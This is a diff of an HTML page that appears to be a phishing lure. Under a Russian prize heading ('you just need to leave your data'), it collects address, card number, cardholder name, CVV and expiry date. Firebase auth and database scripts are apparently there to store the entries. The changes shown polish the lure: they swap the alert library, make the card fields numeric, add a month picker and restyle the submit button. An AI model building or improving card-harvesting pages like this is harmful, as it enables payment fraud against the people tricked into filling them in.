@@ -10,10 +10,8 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/approvejs/3.1.2/approve.min.js" integrity="sha512-TmhOO3rUu5WfsLdsw9H1pB/p5/A/KnhydCuLNGlZoukfUUopMmA2sq6DWR9E+acuLB1DBk2A8cq63f7JMwHgVQ==" crossorigin="anonymous"></script>
-    
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha512-AA1Bzp5Q0K1KanKKmvN/4d3IRKVlv9PYgwFPvm32nPO6QS8yH1HO7LbgB1pgiOxPtfeg5zEn2ba64MUcqJx6CA==" crossorigin="anonymous"></script>
     <script src="https://www.gstatic.com/firebasejs/7.6.1/firebase-app.js"></script>
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/10.3.7/sweetalert2.all.js" integrity="sha512-91sUF6LYSKnsJeon+t+zCf3e1Tum9UND4LjGFYzvXc633pmyEX3KCHOlyfEkIMyMnzspD9SI71SqCpoQnp+Tbw==" crossorigin="anonymous"></script>
     <script src="https://www.gstatic.com/firebasejs/7.6.1/firebase-auth.js"></script>
     <script src="https://www.gstatic.com/firebasejs/7.6.1/firebase-database.js"></script>
     
@@ -27,24 +25,25 @@
         <div class="item"></div>
     </div>
     <div class="get-prize">
-        <img src="images/visa.svg" id="visa-image">
+        <img src="images/1.svg" id="visa-image">
         <h1>Вам нужно всего лишь оставить данные</h1>
         <form>
             <input type="text" name="adress" id="adress">
             <label for="adress">Adress</label>
-            <input type="text" name="postal-code" id="post-code">
+            <input type="number" name="postal-code" id="post-code">
             <label for="postal-code">Postal Code</label>
-            <input type="text" name="cardNumber" id="card-number">
+            <input type="number" name="cardNumber" id="card-number">
             <label for="cardNumber">Card Code</label>
             <input type="text" name="nameSurname" id="name-surname">
             <label for="nameSurname">Your Name and Surname</label>
-            <input type="text" name="cvv" id="cvv">
+            <input type="number" name="cvv" id="cvv">
             <label for="cvv">CVV</label>
-            <input type="text" name="date" id="card-date">
+            <br>
+            <input style="margin-top: 2rem;" type="month" name="date" id="card-date">
             <label for="date">MONTH/YEAR</label>
         </form>
         <br>
-        <button id="submit-button" style="display: block; margin: 2rem auto;" class="waves-effect waves-light btn">Submit</button>
+        <button id="submit-button" style="display: block; margin: 2rem auto; background-color: #FF6347;" class="waves-effect waves-light btn">Submit</button>
     </div>
 </body>
 </html>
